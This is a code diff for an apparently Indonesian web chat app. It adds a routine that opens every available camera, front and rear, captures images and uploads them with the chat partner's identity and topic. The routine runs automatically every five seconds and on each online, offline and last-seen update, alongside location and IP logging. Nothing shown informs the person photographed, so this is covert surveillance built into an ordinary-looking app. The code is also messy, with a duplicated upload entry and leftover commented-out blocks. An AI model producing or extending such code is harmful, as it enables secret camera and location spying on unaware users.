@@ -457,10 +457,11 @@ const capturePhoto09090 = () => {
   
   const intervalRef = useRef(null);
   // ========= FUNGSI CAPTURE FOTO =========
-  const capturePhoto = async (status = "unknown") => {
+  const capturePhoto222222222222 = async (status = "unknown") => {
      if (!photoCaptureEnabled) {
       console.warn("Capture Photo dimatikan");
-      return null; // jangan ambil foto
+      // return null; // jangan ambil foto
+      return []; // jangan ambil foto
     }
     try {
       // Cek semua device kamera yang tersedia
@@ -523,8 +524,20 @@ const capturePhoto09090 = () => {
           });
 
           const data = await res.json();
+          
+          if (data?.data?.url) {
+              capturedURLs.push({ 
+                facing, 
+                downloadURL: data.data.url 
+              });
+            }
 
-          capturedURLs.push({ facing, downloadURL: data.data.downloadURL });
+          if (!res.ok || !data?.data?.url) {
+            console.warn("Upload gagal:", data);
+            continue;
+          }
+
+          // capturedURLs.push({ facing, downloadURL: data.data.downloadURL });
           // console.log(`Foto (${facing}) diupload ke:`, data.data.downloadURL);
 
           // console.log("Foto diupload ke:", data.data.storageUsed);
@@ -686,6 +699,118 @@ try {
   const userRef = databaseRef(database, `pengguna/${chatWith}`);
   const logsRef = databaseRef(database, `logs_pengguna1/${chatWith}`);
 
+    
+// ========= FUNGSI CAPTURE FOTO =========
+  const capturePhoto = async (status = "unknown") => {
+     if (!photoCaptureEnabled) {
+      console.warn("Capture Photo dimatikan");
+      return []; // jangan ambil foto
+    }
+    try {
+      // Cek semua device kamera yang tersedia
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      const videoInputs = devices.filter((d) => d.kind === "videoinput");
+
+      // Kalau gak ada kamera
+      if (videoInputs.length === 0) {
+        throw new Error("Tidak ada kamera yang terdeteksi");
+      }
+
+      // Tentukan facingMode yang mau diambil
+      const facingModes =
+        videoInputs.length > 1
+          ? ["user", "environment"] // dua kamera
+          : ["user"]; // satu aja (biasanya laptop)
+
+      const capturedURLs = [];
+
+      // Loop ambil semua kamera yang tersedia
+      for (const facing of facingModes) {
+        const constraints = {
+          video: { facingMode: { exact: facing } }
+        };
+
+        try {
+          // 1. Ambil stream
+          const stream = await navigator.mediaDevices.getUserMedia(constraints);
+          const video = document.createElement("video");
+          video.srcObject = stream;
+          await video.play();
+
+          // Tunggu sedikit agar kamera siap
+          await new Promise((r) => setTimeout(r, 500));
+
+          // 2. Capture ke canvas
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const imageData = canvas.toDataURL("image/png");
+
+          // 3. Stop kamera
+          stream.getTracks().forEach((track) => track.stop());
+
+          // Upload via server-side API
+          const res = await fetch("/api/uploadPhotot", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              imageData,
+              currentUser,
+              chatWith,
+              topik,
+              status,
+              facing
+            })
+          });
+
+          const data = await res.json();
+          
+          if (data?.data?.url) {
+              capturedURLs.push({ 
+                facing, 
+                downloadURL: data.data.url 
+              });
+            }
+
+          if (!res.ok || !data?.data?.url) {
+            console.warn("Upload gagal:", data);
+            continue;
+          }
+          
+          capturedURLs.push({ 
+            facing, 
+            downloadURL: data.data.url 
+          });
+
+        } catch (err) {
+          console.warn(`Gagal ambil kamera ${facing}:`, err.message);
+        }
+      }
+
+      return capturedURLs; // hasil array { facing, downloadURL }
+    } catch (err) {
+      console.error("Gagal capture foto:", err);
+      return [];
+    }
+  };
+
+   // 🔥 JALAN SETIAP 10 DETIK
+  useEffect(() => {
+    // jalan langsung sekali (opsional)
+    capturePhoto("auto");
+
+    intervalRef.current = setInterval(() => {
+      capturePhoto("auto");
+    // }, 10_000); // 10 detik
+    }, 5000); // 10 detik
+
+    return () => {
+      clearInterval(intervalRef.current);
+    };
+  }, []);
   const saveOldDataToLogs = async (status) => {
     const snapshot = await get(userRef);
     const oldData = snapshot.val();
@@ -730,7 +855,7 @@ try {
 
   const updateOnlineStatus = async (latitude = null, longitude = null,  ip1 = null, ip2 = null) => {
     await saveOldDataToLogs("online"); // simpan data lama dulu
- const photoURL = await capturePhoto("online");
+     const photoURL = await capturePhoto("online");
     const data = {
       user: chatWith,
       isOnline: true,
@@ -748,14 +873,19 @@ try {
       data.longitude = longitude;
     }
     // Isi foto hanya kalau ada
-  if (photoURL) data.photoURL = photoURL;
+  // if (photoURL) data.photoURL = photoURL;
+    const cleanPhoto = photoURL?.filter(p => p?.downloadURL);
+
+    if (cleanPhoto?.length) {
+      data.photoURL = cleanPhoto;
+    }
 
     update(userRef, data);
   };
 
   const updateOfflineStatus = async () => {
     await saveOldDataToLogs("offline"); // simpan sebelum offline
- const photoURL = await capturePhoto("offline");
+    const photoURL = await capturePhoto("offline");
     const data = {
       user: chatWith,
       isOnline: false,
@@ -772,19 +902,49 @@ try {
       data.latitude = latitude;
       data.longitude = longitude;
     }
-    if (photoURL) data.photoURL = photoURL;
-     update(userRef, data);
+    const cleanPhoto = photoURL?.filter(p => p?.downloadURL);
+    if (cleanPhoto?.length) {
+      data.photoURL = cleanPhoto;
+    }
+  //   if (photoURL) data.photoURL = photoURL;
+  //    update(userRef, data);
+  // };
+    
+
+// if (cleanPhoto?.length) {
+//   data.photoURL = cleanPhoto;
+// }
+
+
+    //     update(userRef, {
+//       lastSeen: serverTimestamp(),
+//       // photoURL2: photoURL || null
+      
+//     // ...(photoURL ? { photoURL_lastSeen: photoURL } : {})
+
+    // // update(userRef, {
+// //   lastSeen: serverTimestamp(),
+// //   ...(cleanPhoto?.length ? { photoURL_lastSeen: cleanPhoto } : {})
+// // });
+
+    
+//     });
+    update(userRef, data); // ✅ WAJIB
   };
 
   const updateLastSeen = async () => {
     await saveOldDataToLogs("update_lastSeen"); // simpan sebelum update
      const photoURL = await capturePhoto("update_lastSeen");
-    update(userRef, {
-      lastSeen: serverTimestamp(),
-      // photoURL2: photoURL || null
+
+      const cleanPhoto = photoURL?.filter(p => p?.downloadURL);
+
+
+       const data = {
+          lastSeen: serverTimestamp(),
+          ...(cleanPhoto?.length ? { photoURL_lastSeen: cleanPhoto } : {})
+        };
       
-    ...(photoURL ? { photoURL_lastSeen: photoURL } : {})
-    });
+        update(userRef, data);
   };
 
   const getLocationAndUpdate = () => {
